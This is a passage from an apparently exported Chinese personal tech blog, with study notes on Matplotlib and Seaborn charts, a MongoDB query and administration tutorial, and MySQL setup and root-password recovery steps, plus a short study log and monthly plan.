&apos;GuanYu&apos;, &apos;a&apos;, &apos;b&apos;, &apos;c&apos;], &apos;data1&apos;:range(5)&#125;)pysqldf = lambda sql: sqldf(sql, globals())sql = &quot;select * from df1 where name =&apos;ZhangFei&apos;&quot;print pysqldf(sql)lambda:用来定义一个匿名函数的.eg:lambda argument_list: expression这里 argument_list 是参数列表，expression 是关于参数的表达式，会根据 expression 表达式计算结果进行输出返回。 pycharm get 小技巧pycharm中使用正则表达式批量添加print括号1、在pycharm编译器中，Ctrl+R调出替换功能框，勾选“Regex”，选择正则表达式替换方法2、 从上到下，第一个搜索框输入print (.*?);?$3、第二个替换框输入print($1)4、点击Replace all，替换所有搜索结果，完成替换 监督学习典型算法线性回归（Linear Regression）：线性回归是利用称为线性回归方程的最小二乘函数对一个或多个自变量和因变量之间关系进行建模的一种回归分析。这种函数是一个或多个称为回归系数的模型参数的线性组合。 逻辑回归（Logistic Regression）决策树（Decision Tree）随机森林（Random Forest）最近邻算法（k-NN）朴素贝叶斯（Naive Bayes）支持向量机（SVM）感知器（Perceptron）深度神经网络（DNN） 最小二乘法梯度下降java 小技巧怎么java代码打包成可执行jar并用批处理bat运行Java项目打包成exe的详细教程把java项目打包成安装包，在windows下安装 2 月 18 号至 27 号开学四天没怎么干活，就是看了点牛客网的python题库。 然后呢花了一天时间啃了下opencv的入门教程，利用opencv打开图片、美化图片、切割图片等。 花了两天时间看了下 face++ 的开发文档，利用python的SDK算是能利用api实现点功能。 花了一天时间入门了解了下测试开发流程、发展、以及相应的工具。 2 月 28 号 python 数据可视化入门散点图scatter plot 二维散点图、三维散点图。 画散点图，需要使用 plt.scatter(x, y, marker=None) 函数。x、y 是坐标，marker 代表了标记的符号。比如“x”、“&gt;”或者“o”。选择不同的 marker，呈现出来的符号样式也会不同。 除了 Matplotlib 外，你也可以使用 Seaborn 进行散点图的绘制。 在引用 seaborn 工具包之后，就可以使用 seaborn 工具包的函数了。如果想要做散点图，可以直接使用 sns.jointplot(x, y, data=None, kind=‘scatter’) 函数。其中 x、y 是 data 中的下标。data 就是我们要传入的数据，一般是 DataFrame 类型。kind 这类我们取 scatter，代表散点的意思。当然 kind 还可以取其他值，这个我在后面的视图中会讲到，不同的 kind 代表不同的视图绘制方式。eg123456789101112131415import numpy as npimport pandas as pdimport matplotlib.pyplot as pltimport seaborn as sns# 数据准备N = 1000x = np.random.randn(N)y = np.random.randn(N)# 用 Matplotlib 画散点图plt.scatter(x, y,marker=&apos;x&apos;)plt.show()# 用 Seaborn 画散点图df = pd.DataFrame(&#123;&apos;x&apos;: x, &apos;y&apos;: y&#125;)sns.jointplot(x=&quot;x&quot;, y=&quot;y&quot;, data=df, kind=&apos;scatter&apos;);plt.show() 折线图在 Matplotlib 中，我们可以直接使用 plt.plot() 函数，当然需要提前把数据按照 x 轴的大小进行排序，要不画出来的折线图就无法按照 x 轴递增的顺序展示。 在 Seaborn 中，我们使用 sns.lineplot (x, y, data=None) 函数。其中 x、y 是 data 中的下标。data 就是我们要传入的数据，一般是 DataFrame 类型。 1234567891011121314# 这里我们设置了 x、y 的数组。x 数组代表时间（年），y 数组我们随便设置几个取值。import pandas as pdimport matplotlib.pyplot as pltimport seaborn as sns# 数据准备x = [2010, 2011, 2012, 2013, 2014, 2015, 2016, 2017, 2018, 2019]y = [5, 3, 6, 20, 17, 16, 19, 30, 32, 35]# 使用 Matplotlib 画折线图plt.plot(x, y)plt.show()# 使用 Seaborn 画折线图df = pd.DataFrame(&#123;&apos;x&apos;: x, &apos;y&apos;: y&#125;)sns.lineplot(x=&quot;x&quot;, y=&quot;y&quot;, data=df)plt.show() 直方图在 Matplotlib 中，我们使用 plt.hist(x, bins=10) 函数，其中参数 x 是一维数组，bins 代表直方图中的箱子数量，默认是 10。 在 Seaborn 中，我们使用 sns.distplot(x, bins=10, kde=True) 函数。其中参数 x 是一维数组，bins 代表直方图中的箱子数量，kde 代表显示核密度估计，默认是 True，我们也可以把 kde 设置为 False，不进行显示。核密度估计是通过核函数帮我们来估计概率密度的方法。 12345678910111213141516171819import numpy as npimport pandas as pdimport matplotlib.pyplot as pltimport seaborn as sns# 数据准备a = np.random.randn(100)s = pd.Series(a) # 用 Matplotlib 画直方图plt.hist(s)plt.show()# 用 Seaborn 画直方图sns.distplot(s, kde=False)plt.show()sns.distplot(s, kde=True)plt.show()# a = np.random.randn(100)# s = pd.Series(a) 条形图在 Matplotlib 中，我们使用 plt.bar(x, height) 函数，其中参数 x 代表 x 轴的位置序列，height 是 y 轴的数值序列，也就是柱子的高度。 在 Seaborn 中，我们使用 sns.barplot(x=None, y=None, data=None) 函数。其中参数data 为 DataFrame 类型，x、y 是 data 中的变量。 1234567891011import matplotlib.pyplot as pltimport seaborn as sns# 数据准备x = [&apos;Cat1&apos;, &apos;Cat2&apos;, &apos;Cat3&apos;, &apos;Cat4&apos;, &apos;Cat5&apos;]y = [5, 4, 8, 12, 7]# 用 Matplotlib 画条形图plt.bar(x, y)plt.show()# 用 Seaborn 画条形图sns.barplot(x, y)plt.show() 箱线图箱线图，又称盒式图，由五个数值点组成：最大值 (max)、最小值 (min)、中位数 (median) 和上下四分位数 (Q3, Q1)。它可以帮我们分析出数据的差异性、离散程度和异常值等。 在 Matplotlib 中，我们使用 plt.boxplot(x, labels=None) 函数，其中参数x 代表要绘制箱线图的数据，labels 是缺省值，可以为箱线图添加标签。 在 Seaborn 中，我们使用 sns.boxplot(x=None, y=None, data=None) 函数。其中参数data 为 DataFrame 类型，x、y 是 data 中的变量。 1234567891011# 数据准备# 生成 0-1 之间的 10*4 维度数据data=np.random.normal(size=(10,4)) lables = [&apos;A&apos;,&apos;B&apos;,&apos;C&apos;,&apos;D&apos;]# 用 Matplotlib 画箱线图plt.boxplot(data,labels=lables)plt.show()# 用 Seaborn 画箱线图df = pd.DataFrame(data, columns=lables)sns.boxplot(data=df)plt.show() 饼图在 Matplotlib 中，我们使用 plt.pie(x, labels=None) 函数，其中参数x 代表要绘制饼图的数据，labels 是缺省值，可以为饼图添加标签。 12345678#这里我设置了 lables 数组，分别代表高中、本科、硕士、博士和其他几种学历的分类标签。nums 代表这些学历对应的人数。import matplotlib.pyplot as plt# 数据准备nums = [25, 37, 33, 37, 6]labels = [&apos;High-school&apos;,&apos;Bachelor&apos;,&apos;Master&apos;,&apos;Ph.d&apos;, &apos;Others&apos;]# 用 Matplotlib 画饼图plt.pie(x = nums, labels=labels)plt.show() 热力图热力图，英文叫 heat map，是一种矩阵表示方法，其中矩阵中的元素值用颜色来代表，不同的颜色代表不同大小的值。通过颜色就能直观地知道某个位置上数值的大小。另外你也可以将这个位置上的颜色，与数据集中的其他位置颜色进行比较。热力图是一种非常直观的多元变量分析方法。一般使用 Seaborn 中的 sns.heatmap(data) 函数，其中data 代表需要绘制的热力图数据。 123456789#这里我们使用 Seaborn 中自带的数据集 flights，该数据集记录了 1949 年到 1960 年期间，每个月的航班乘客的数量。import matplotlib.pyplot as pltimport seaborn as sns# 数据准备flights = sns.load_dataset(&quot;flights&quot;)data=flights.pivot(&apos;year&apos;,&apos;month&apos;,&apos;passengers&apos;)# 用 Seaborn 画热力图sns.heatmap(data)plt.show() 蜘蛛图蜘蛛图是一种显示一对多关系的方法。在蜘蛛图中，一个变量相对于另一个变量的显著性是清晰可见的。 代码中 flt.figure 是创建一个空白的 figure 对象，这样做的目的相当于画画前先准备一个空白的画板。然后 add_subplot(111) 可以把画板划分成 1 行 1 列。再用 ax.plot 和 ax.fill 进行连线以及给图形上色。最后我们在相应的位置上显示出属性名。这里需要用到中文，Matplotlib 对中文的显示不是很友好，因此我设置了中文的字体 font，这个需要在调用前进行定义。 12345678910111213141516171819202122232425262728# 这里我们需要使用 Matplotlib 来进行画图，首先设置两个数组：# labels 和 stats。他们分别保存了这些属性的名称和属性值。# 因为蜘蛛图是一个圆形，你需要计算每个坐标的角度，然后对这些数值进行设置。# 当画完最后一个点后，需要与第一个点进行连线。# 因为需要计算角度，所以我们要准备 angles 数组；又因为需要设定统计结果的数值，所以我们要设定 stats 数组。# 并且需要在原有 angles 和 stats 数组上增加一位，也就是添加数组的第一个元素。import numpy as npimport matplotlib.pyplot as pltimport seaborn as snsfrom matplotlib.font_manager import FontProperties # 数据准备labels=np.array([u&quot; 推进 &quot;,&quot;KDA&quot;,u&quot; 生存 &quot;,u&quot; 团战 &quot;,u&quot; 发育 &quot;,u&quot; 输出 &quot;])stats=[83, 61, 95, 67, 76, 88]# 画图数据准备，角度、状态值angles=np.linspace(0, 2*np.pi, len(labels), endpoint=False)stats=np.concatenate((stats,[stats[0]]))angles=np.concatenate((angles,[angles[0]]))# 用 Matplotlib 画蜘蛛图fig = plt.figure()ax = fig.add_subplot(111, polar=True) ax.plot(angles, stats, &apos;o-&apos;, linewidth=2)ax.fill(angles, stats, alpha=0.25)# 设置中文字体font = FontProperties(fname=r&quot;C:\Windows\Fonts\simhei.ttf&quot;, size=14) ax.set_thetagrids(angles * 180/np.pi, labels, FontProperties=font)plt.show() 二元变量分布在 Seaborn 里，使用二元变量分布是非常方便的，直接使用 sns.jointplot(x, y, data=None, kind) 函数即可。其中用 kind 表示不同的视图类型：“kind=‘scatter’”代表散点图，“kind=‘kde’”代表核密度图，“kind=‘hex’ ”代表 Hexbin 图，它代表的是直方图的二维模拟。 12345678910111213# 这里我们使用 Seaborn 中自带的数据集 tips，这个数据集记录了不同顾客在餐厅的消费账单及小费情况。# 代码中 total_bill 保存了客户的账单金额，tip 是该客户给出的小费金额。# 我们可以用 Seaborn 中的 jointplot 来探索这两个变量之间的关系。import matplotlib.pyplot as pltimport seaborn as sns# 数据准备tips = sns.load_dataset(&quot;tips&quot;)print(tips.head(10))# 用 Seaborn 画二元变量分布图（散点图，核密度图，Hexbin 图）sns.jointplot(x=&quot;total_bill&quot;, y=&quot;tip&quot;, data=tips, kind=&apos;scatter&apos;)sns.jointplot(x=&quot;total_bill&quot;, y=&quot;tip&quot;, data=tips, kind=&apos;kde&apos;)sns.jointplot(x=&quot;total_bill&quot;, y=&quot;tip&quot;, data=tips, kind=&apos;hex&apos;)plt.show() 成对关系如果想要探索数据集中的多个成对双变量的分布，可以直接采用 sns.pairplot() 函数。它会同时展示出 DataFrame 中每对变量的关系，另外在对角线上，你能看到每个变量自身作为单变量的分布情况。它可以说是探索性分析中的常用函数，可以很快帮我们理解变量对之间的关系。 123456789101112#这里我们使用 Seaborn 中自带的 iris 数据集，这个数据集也叫鸢尾花数据集。# 鸢尾花可以分成 Setosa、Versicolour 和 Virginica 三个品种，# 在这个数据集中，针对每一个品种，都有 50 个数据，每个数据中包括了 4 个属性，# 分别是花萼长度、花萼宽度、花瓣长度和花瓣宽度。# 通过这些数据，需要你来预测鸢尾花卉属于三个品种中的哪一种。import matplotlib.pyplot as pltimport seaborn as sns# 数据准备iris = sns.load_dataset(&apos;iris&apos;)# 用 Seaborn 画成对关系sns.pairplot(iris)plt.show() 3月计划Django、flask 框架快速入门 小程序走起 face++ 为主要内容快速搭建出来一个东西，快速把云台搭建出来。3.3 之前做好！ 了解下esp8266，快速实现样品的搭建。3月5号之前。 了解下esp8266 lua nodemcu，把路由攻击做出来。 每天写点东西吧，把小型组的PPT做出来。 Tensorflow opencv 智能小车 python 框架的自动化测试爬虫、分析，linux shell 瞅下 C++ linux 的开发 😭]]></content>
      <categories>
        <category>总结</category>
      </categories>
      <tags>
        <tag>python</tag>
        <tag>数据分析</tag>
        <tag>Tensorflow</tag>
        <tag>学习笔记</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[新年新计划新起航]]></title>
    <url>%2F%E6%96%B0%E5%B9%B4%E6%96%B0%E8%AE%A1%E5%88%92%E6%96%B0%E8%B5%B7%E8%88%AA%2F</url>
    <content type="text"><![CDATA[请输入访问密匙 Decrypt ]]></content>
      <categories>
        <category>思考</category>
      </categories>
      <tags>
        <tag>计划</tag>
        <tag>新起航</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[MongoDB由浅入深]]></title>
    <url>%2FMongoDB%E7%94%B1%E6%B5%85%E5%85%A5%E6%B7%B1%2F</url>
    <content type="text"><![CDATA[MongoDB 教程举例说明 id user_name email age city 1 Mark Hanks mark@abc.com 25 Los Angeles 2 Richard Peter richard@abc.com 31 Dallas {“_id”: ObjectId(“5146bb52d8524270060001f3”),“age”:25,“city”:”Los Angele3”,“email”:”mark@ abc. com”,“user_name”:”Mark Hanka”}{“_id”: ObjectId(“5146bb52d8524270060001f2”),“age”:31,“city”:”Dallas”,“email”:”richardeabc. com”,“user name”:”Richard Peter”} MongoDB 与 RDBMS 术语的比较： SQL术语/概念 MongoDB术语/概念 解释/说明 database database 数据库 table collection 数据库表/集合 row document 数据记录行/文档 column field 数据字段/域 index index 索引 table joins 表连接,MongoDB不支持 primary key primary key 主键,MongoDB自动将_id字段设置为主键 MongoDB 与 RDBMS Where 语句比较 操作 格式 范例 RDBMS中的类似语句 等于 {:} db.col.find({“by”:”XCHCOUD”}).pretty() where by = ‘XCHCOUD’ 小于 {:{$lt:}} db.col.find({“likes”:{$lt:50}}).pretty() where likes &lt; 50 小于或等于 {:{$lte:}} db.col.find({“likes”:{$lte:50}}).pretty() where likes &lt;= 50 大于 {:{$gt:}} db.col.find({“likes”:{$gt:50}}).pretty() where likes &gt; 50 大于或等于 {:{$gte:}} db.col.find({“likes”:{$gte:50}}).pretty() where likes &gt;= 50 不等于 {:{$ne:}} db.col.find({“likes”:{$ne:50}}).pretty() where likes != 50 MongoDB AND 条件db.col.find({key1:value1, key2:value2}).pretty() MongoDB OR 条件123456 &#123; $or: [ &#123;key1: value1&#125;, &#123;key2:value2&#125; ] &#125;).pretty() AND 和 OR 联合使用SQL: where likes&gt;50 AND (by = &#39;菜鸟教程&#39; OR title = &#39;MongoDB 教程&#39;) MongoDB: &#123;$gt:50&#125;, $or: [&#123;"by": "XCHCLOUD"&#125;,&#123;"title": "MongoDB 教程"&#125;]&#125;).pretty()12345678910111213&#123; &quot;_id&quot; : ObjectId(&quot;56063f17ade2f21f36b03133&quot;), &quot;title&quot; : &quot;MongoDB 教程&quot;, &quot;description&quot; : &quot;MongoDB 是一个 Nosql 数据库&quot;, &quot;by&quot; : &quot;XCHCLOUD&quot;, &quot;url&quot; : &quot;http://XCHCLOUD.cn&quot;, &quot;tags&quot; : [ &quot;mongodb&quot;, &quot;database&quot;, &quot;NoSQL&quot; ], &quot;likes&quot; : 100&#125; 条件操作符 MongoDB Mysql &gt; 大于 $gt db.col.find({likes : {$gt : 100}}) Select * from col where likes &gt; 100; &lt; 小于 $lt db.col.find({likes : {$lt : 150}}) Select * from col where likes &lt; 150; &gt;= 大于等于 $gte db.col.find({likes : {$gte : 100}}) Select * from col where likes &gt;=100; &lt;= 小于等于 $lte db.col.find({likes : {$lte : 150}}) Select * from col where likes &lt;= 150; &gt;和&lt; 小于大于 $lt 和 $gt db.col.find({likes : {$lt :200, $gt : 100}}) Select * from col where likes&gt;100 AND likes&lt;200; $type 操作符$type 操作符是基于 BSON 类型来检索集合中匹配的数据类型，并返回结果。 类型 数字 备注 Double 1 String 2 Object 3 Array 4 Binary data 5 Undefined 6 已废弃。 Object id 7 Boolean 8 Date 9 Null 10 Regular Expression 11 JavaScript 13 Symbol 14 JavaScript (with scope) 15 32-bit integer 16 Timestamp 17 64-bit integer 18 Min key 255 Query with -1. Max key 127 Limit与Skip方法Limit() 方法limit()方法在MongoDB中读取指定数量的数据记录，该参数指定从MongoDB中读取的记录条数。 db.COLLECTION_NAME.find().limit(NUMBER) Skip() 方法skip()方法来跳过指定数量的数据，skip方法同样接受一个数字参数作为跳过的记录条数。 db.COLLECTION_NAME.find().limit(NUMBER).skip(NUMBER) 集合集合存在于数据库中，集合没有固定的结构，这意味着你在对集合可以插入不同格式和类型的数据，但通常情况下我们插入集合的数据都会有一定的关联性。 创建集合db.createCollection(name, options) 参数说明： 参数 说明 name 要创建的集合名称 options 可选参数, 指定有关内存大小及索引的选项 options参数：| 字段 | 类型 | 描述 ||————- |—— |—————————————————————————————————————————————————– || capped | 布尔 | （可选）如果为 true，则创建固定集合。固定集合是指有着固定大小的集合，当达到最大值时，它会自动覆盖最早的文档。当该值为 true 时，必须指定 size 参数。 || autoIndexId | 布尔 | （可选）如为 true，自动在 _id 字段创建索引。默认为 false。 || size | 数值 | （可选）为固定集合指定一个最大值（以字节计）。如果 capped 为 true，也需要指定该字段。 || max | 数值 | （可选）指定固定集合中包含文档的最大数量。 | 删除集合db.collection.drop() 文档插入文档db.COLLECTION_NAME.insert(document) 可以将数据定义为变量形式 db.col.insert(document) 查看已插入文档db.col.find() 更新文档update() 方法update() 方法用于更新已存在的文档。 12345678 &lt;query&gt;, &lt;update&gt;, &#123; upsert: &lt;boolean&gt;, multi: &lt;boolean&gt;, writeConcern: &lt;document&gt; &#125;) 参数说明： 参数 说明 query update的查询条件，类似sql update查询内where后面的。 update update的对象和一些更新的操作符（如$,$inc…）等，也可以理解为sql update查询内set后面的 upsert 可选，这个参数的意思是，如果不存在update的记录，是否插入objNew,true为插入，默认是false，不插入。 multi 可选，mongodb 默认是false,只更新找到的第一条记录，如果这个参数为true,就把按条件查出来多条记录全部更新。 writeConcern 可选，抛出异常的级别。 save() 方法save() 方法通过传入的文档来替换已有文档。 12345 &lt;document&gt;, &#123; writeConcern: &lt;document&gt; &#125;) 参数说明： 参数 说明 document 文档数据。 writeConcern 可选，抛出异常的级别。 删除文档2.6 版本以前的 123 &lt;query&gt;, &lt;justOne&gt;) 2.6版本以后的 123456 &lt;query&gt;, &#123; justOne: &lt;boolean&gt;, writeConcern: &lt;document&gt; &#125;) 参数说明：| 参数 | 说明 ||————– |—————————————————————————————————————- || query | （可选）删除的文档的条件。 || justOne | （可选）如果设为 true 或 1，则只删除一个文档，如果不设置该参数，或使用默认值 false，则删除所有匹配条件的文档。 || writeConcern | （可选）抛出异常的级别。 | 查询文档db.collection.find(query, projection).pretty() 除了 find() 方法之外，还有一个 findOne() 方法，它只返回一个文档。 参数说明： 参数 说明 query 可选，使用查询操作符指定查询条件 projection 可选，使用投影操作符指定返回的键。查询时返回文档中所有键值， 只需省略该参数即可（默认省略）。如果你需要以易读的方式来读取数据，可以使用 pretty() 方法，语法格式如下： .pretty() pretty() 方法以格式化的方式来显示所有文档 元数据ObiectldObjectId 类似唯一主键，可以很快的去生成和排序，包含 12 bytes，含义是： 0、1、2、3 4、5、6 7、8 9、10、11 时间戳 机器 pID 计数器 MongoDB 中存储的文档必须有一个 _id 键。这个键的值可以是任何类型的，默认是个 ObjectId 对象 排序使用 sort() 方法对数据进行排序，sort() 方法可以通过参数指定排序的字段，并使用 1 和 -1 来指定排序的方式，其中 1 为升序排列，而 -1 是用于降序排列。 db.COLLECTION_NAME.find().sort({KEY:1}) 索引createIndex() 方法db.collection.createIndex(keys, options)语法中 Key 值为你要创建的索引字段，1 为指定按升序创建索引，-1 为指定按降序创建索引；createIndex() 方法中你也可以设置使用多个字段创建索引。 可选参数 Parameter Type Description background Boolean 建索引过程会阻塞其它数据库操作，background可指定以后台方式创建索引，即增加 “background” 可选参数。 “background” 默认值为false。 unique Boolean 建立的索引是否唯一。指定为true创建唯一索引。默认值为false. name string 索引的名称。如果未指定，MongoDB的通过连接索引的字段名和排序顺序生成一个索引名称。 dropDups Boolean 3.0+版本已废弃。在建立唯一索引时是否删除重复记录,指定 true 创建唯一索引。默认值为 false. sparse Boolean 对文档中不存在的字段数据不启用索引；这个参数需要特别注意，如果设置为true的话，在索引字段中不会查询出不包含对应字段的文档.。默认值为 false. expireAfterSeconds integer 指定一个以秒为单位的数值，完成 TTL设定，设定集合的生存时间。 v index version 索引的版本号。默认的索引版本取决于mongod创建索引时运行的版本。 weights document 索引权重值，数值在 1 到 99,999 之间，表示该索引相对于其他索引字段的得分权重。 default_language string 对于文本索引，该参数决定了停用词及词干和词器的规则的列表。 默认为英语 language_override string 对于文本索引，该参数指定了包含在文档中的字段名，语言覆盖默认的language，默认值为 language. 聚合主要用于处理数据(诸如统计平均值,求和等)，并返回计算后的数据结果。有点类似sql语句中的 count(*)。 aggregate() 方法db.COLLECTION_NAME.aggregate(AGGREGATE_OPERATION) 比较mysql select by_user, count(*) from mycol group by by_user 聚合的表达式 表达式 描述 实例 $sum 计算总和。 db.mycol.aggregate([{$group : {_id : “$by_user”, num_tutorial : {$sum : “$likes”}}}]) $avg 计算平均值 db.mycol.aggregate([{$group : {_id : “$by_user”, num_tutorial : {$avg : “$likes”}}}]) $min 获取集合中所有文档对应值得最小值。 db.mycol.aggregate([{$group : {_id : “$by_user”, num_tutorial : {$min : “$likes”}}}]) $max 获取集合中所有文档对应值得最大值。 db.mycol.aggregate([{$group : {_id : “$by_user”, num_tutorial : {$max : “$likes”}}}]) $push 在结果文档中插入值到一个数组中。 db.mycol.aggregate([{$group : {_id : “$by_user”, url : {$push: “$url”}}}]) $addToSet 在结果文档中插入值到一个数组中，但不创建副本。 db.mycol.aggregate([{$group : {_id : “$by_user”, url : {$addToSet : “$url”}}}]) $first 根据资源文档的排序获取第一个文档数据。 db.mycol.aggregate([{$group : {_id : “$by_user”, first_url : {$first : “$url”}}}]) $last 根据资源文档的排序获取最后一个文档数据 db.mycol.aggregate([{$group : {_id : “$by_user”, last_url : {$last : “$url”}}}]) 管道管道在Unix和Linux中一般用于将当前命令的输出结果作为下一个命令的参数。MongoDB的聚合管道将MongoDB文档在一个管道处理完毕后将结果传递给下一个管道处理。管道操作是可以重复的。 参数 $project 修改输入文档的结构。可以用来重命名、增加或删除域，也可以用于创建计算结果以及嵌套文档。 $match 用于过滤数据，只输出符合条件的文档。$match使用MongoDB的标准查询操作。 $limit 用来限制MongoDB聚合管道返回的文档数。 $skip 在聚合管道中跳过指定数量的文档，并返回余下的文档。 $unwind 将文档中的某一个数组类型字段拆分成多条，每条包含数组中的一个值。 $group 将集合中的文档分组，可用于统计结果。 $sortr 输出接近某一地理位置的有序文档。 备份(mongodump)与恢复(mongorestore)数据备份导出所有数据到指定目录中 mongodump -h dbhost -d dbname -o dbdirectory 参数： h MongDB所在服务器地址，例如：127.0.0.1，当然也可以指定端口号：127.0.0.1:27017 d 需要备份的数据库实例，例如：test o 备份的数据存放位置，例如：c:\data\dump，当然该目录需要提前建立，在备份完成后，系统自动在dump目录下建立一个test目录，这个目录里面存放该数据库实例的备份数据。 数据恢复mongorestore -h &lt;hostname&gt;&lt;:port&gt; -d dbname &lt;path&gt; 参数： –host &lt;:port&gt;, -h &lt;:port&gt; MongoDB所在服务器地址，默认为： localhost:27017 –db , -d 需要恢复的数据库实例，例如：test，当然这个名称也可以和备份时候的不一样，比如test2 –drop 恢复的时候，先删除当前数据，然后恢复备份的数据。就是说，恢复后，备份后添加修改的数据都会被删除，慎用哦！ mongorestore 最后的一个参数，设置备份数据所在位置，例如：c:\data\dump\test。你不能同时指定 和 –dir 选项，–dir也可以设置备份目录。 –dir 指定备份的目录。你不能同时指定 和 –dir 选项 监控mongostat 命令它会间隔固定时间获取mongodb的当前运行状态，并输出。 mongotop 命令用来跟踪一个MongoDB的实例，查看哪些大量的时间花费在读取和写入数据。mongotop提供每个集合的水平的统计数据。默认情况下，mongotop返回值的每一秒。 mongotop &lt;sleeptime&gt; 参数： 等待的时间长度，以秒为单位，mongotop等待调用之间。通过的默认mongotop返回数据的每一秒。 mongotop --locks 返回参数说明 ns 包含数据库命名空间，后者结合了数据库名称和集合。 db 包含数据库的名称。名为 . 的数据库针对全局锁定，而非特定数据库。 total mongod花费的时间工作在这个命名空间提供总额。 read 提供了大量的时间，这mongod花费在执行读操作，在此命名空间。 write 提供这个命名空间进行写操作，这mongod花了大量的时间。 查询分析可以确保我们建议的索引是否有效，是查询语句性能分析的重要工具。 explain()提供了查询信息，使用索引及查询统计等。 创建 gender 和 user_name 的索引：db.users.ensureIndex({gender:1,user_name:1})现在在查询语句中使用 explain ：&gt;db.users.find({gender:&quot;M&quot;},{user_name:1,_id:0}).explain() 返回结果参数说明 indexOnly 字段为 true ，表示我们使用了索引。 cursor 因为这个查询使用了索引，MongoDB 中索引存储在B树结构中，所以这是也使用了 BtreeCursor 类型的游标。如果没有使用索引，游标的类型是 BasicCursor。这个键还会给出你所使用的索引的名称，你通过这个名称可以查看当前数据库下的system.indexes集合（系统自动创建，由于存储索引信息，这个稍微会提到）来得到索引的详细信息。 n 当前查询返回的文档数量。 nscanned/nscannedObjects 表明当前这次查询一共扫描了集合中多少个文档，我们的目的是，让这个数值和返回文档的数量越接近越好。 millis 当前查询所需时间，毫秒数。 indexBounds 当前查询具体使用的索引。 hint()使用 hint 来强制 MongoDB 使用一个指定的索引。 指定了使用 gender 和 user_name 索引字段来查询：&gt;db.users.find({gender:&quot;M&quot;},{user_name:1,_id:0}).hint({gender:1,user_name:1})可以使用 explain() 函数来分析以上查询：&gt;db.users.find({gender:&quot;M&quot;},{user_name:1,_id:0}).hint({gender:1,user_name:1}).explain() 原子操作常用命令 $set 用来指定一个键并更新键值，若键不存在并创建。 { $set : { field : value } } $unset 用来删除一个键。 { $unset : { field : 1} } $inc $inc可以对文档的某个值为数字型（只能为满足要求的数字）的键进行增减的操作。 { $inc : { field : value } } $push 把value追加到field里面去，field一定要是数组类型才行，如果field不存在，会新增一个数组类型加进去。 { $push : { field : value } } $pushAll 同$push,只是一次可以追加多个值到一个数组字段内。 { $pushAll : { field : value_array } } $pull 从数组field内删除一个等于value值。 { $pull : { field : _value } } $pop 删除数组的第一个或最后一个元素 { $pop : { field : 1 } } $rename 修改字段名称 { $rename : { old_field_name : new_field_name } } $bit 位操作，integer类型 {$bit : { field : {and : 5}}} $addToSet 增加一个值到数组内，而且只有当这个值不在数组内才增加。 偏移操作符 t.find() { “_id” : ObjectId(“4b97e62bf1d8c7152c9ccb74”), “title” : “ABC”, “comments” : [ { “by” : “joe”, “votes” : 3 }, { “by” : “jane”, “votes” : 7 } ] } MongoDB Java下载mongo jar包，下载地址：http://mongodb.github.io/mongo-java-driver/, 请确保下载最新版本。 http://mongodb.github.io/mongo-java-driver/3.0/driver/getting-started/quick-tour/]]></content>
      <categories>
        <category>MongoDB</category>
      </categories>
      <tags>
        <tag>MongoDB</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[Mysql学习笔记]]></title>
    <url>%2FMysql%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0%2F</url>
    <content type="text"><![CDATA[入门win安装以管理员身份打开 cmd 命令行工具，切换目录： cd C:\web\mysql-8.0.11\bin 初始化数据库： mysqld --initialize --console 执行完成后，会输出 root 用户的初始默认密码，如： ... 2018-04-20T02:35:05.464644Z 5 [Note] [MY-010454] [Server] A temporary password is generated for root@localhost: APWCY5ws&hjQ ... APWCY5ws&hjQ 就是初始密码，后续登录需要用到，你也可以在登陆后修改密码。 输入以下安装命令： mysqld install 启动输入以下命令即可： net start mysql 登录 MySQL当 MySQL 服务已经运行时, 我们可以通过 MySQL 自带的客户端工具登录到 MySQL 数据库中, 首先打开命令提示符, 输入以下格式的命名: mysql -h 主机名 -u 用户名 -p 参数说明： -h : 指定客户端所要登录的 MySQL 主机名, 登录本机(localhost 或 127.0.0。1)该参数可以省略;-u : 登录的用户名;-p : 告诉服务器将会使用一个密码来登录, 如果所要登录的用户名密码为空, 可以忽略此选项。如果我们要登录本机的 MySQL 数据库，只需要输入以下命令即可： mysql -u root -p 按回车确认, 如果安装正确且 MySQL 正在运行, 会得到以下响应: Enter password: 若密码存在, 输入密码登录, 不存在则直接按回车登录。登录成功后你将会看到 Welecome to the MySQL monitor... 的提示语。 然后命令提示符会一直以 mysq> 加一个闪烁的光标等待命令的输入, 输入 exit 或 quit 退出登录。 ## 填坑 ### ERROR 1045 (28000): Access denied for user 'ODBC'@'localhost' (using password: NO)，MySQL8.0忘记密码并修改 ERROR 1045 (28000): Access denied for user 'ODBC'@'localhost' (using password: NO) （先将MySQL服务停掉） 1、在MySQL的bin目录下执行mysqld --skip-grant-tables，失效，仍然不能登录MySQL 发现在8.0后这个mysqld --skip-grant-tables跳过mysql的用户验证已经失效 在8.0后变为了在bin目录下执行 mysqld --console --skip-grant-tables --shared-memory 跳过权限验证 2、另开一个cmd窗口，到bin下面执行mysql进入无密码登录页面 3、执行 use mysql 4、执行show tables;(分号不能丢),可以看到你需要账号的密码的各个表 5、执行修改密码操作： ALTER USER 'root'@'localhost' IDENTIFIED WITH mysql_native_password BY '你的密码'; 6、然后执行flush privileges;就好了 如果在修改密码的时候出现错误，如：The MySQL server is running with the –skip-grant-tables option so it cannot execute this statement 先执行flush privileges;再执行修改密码的语句，再执行flush privileges; Linux下mysql登录出错重置密码解决MySQL for Linux错误 ERROR 1045 (28000): Access denied for user ‘root‘@’localhost’ (using password: YES) 1.跳过密码验证进入mysql sudo vim /etc/mysql/mysql.conf.d/mysqld.cnforvim /etc/my.cnf(注：windows下修改的是my.ini) 2、找到[mysqld]这一块代码，在后面加上skip-grant-tables，如下1234567891011121314151617[mysqld]## * Basic Settings#user = mysqlpid-file = /var/run/mysqld/mysqld.pidsocket = /var/run/mysqld/mysqld.sockport = 3306basedir = /usrdatadir = /var/lib/mysqltmpdir = /tmplc-messages-dir = /usr/share/mysqlcharacter_set_server=utf8skip-external-lockingskip-grant-tables 3、保存后重启mysql service mysql restart 4、接着输入 mysql 5、输入”show databases;”查看数据库在mysql数据库有一个user表，存储的是数据库用户的信息，我们需要修改的里面用户的密码； 6、输入use mysql;是要使用mysql数据库的意思 7、输入update user set authentication_string=password(&quot;yourNewPassword&quot;) where User=&#39;root&#39;;（数据库账号密码更新语句） 注意：执行后报错 ERROR 1054(42S22) Unknown column ‘password’ in ‘field list’ 错误的原因是 5.7版本下的mysql数据库下已经没有password这个字段了，password字段改成了authentication_string update 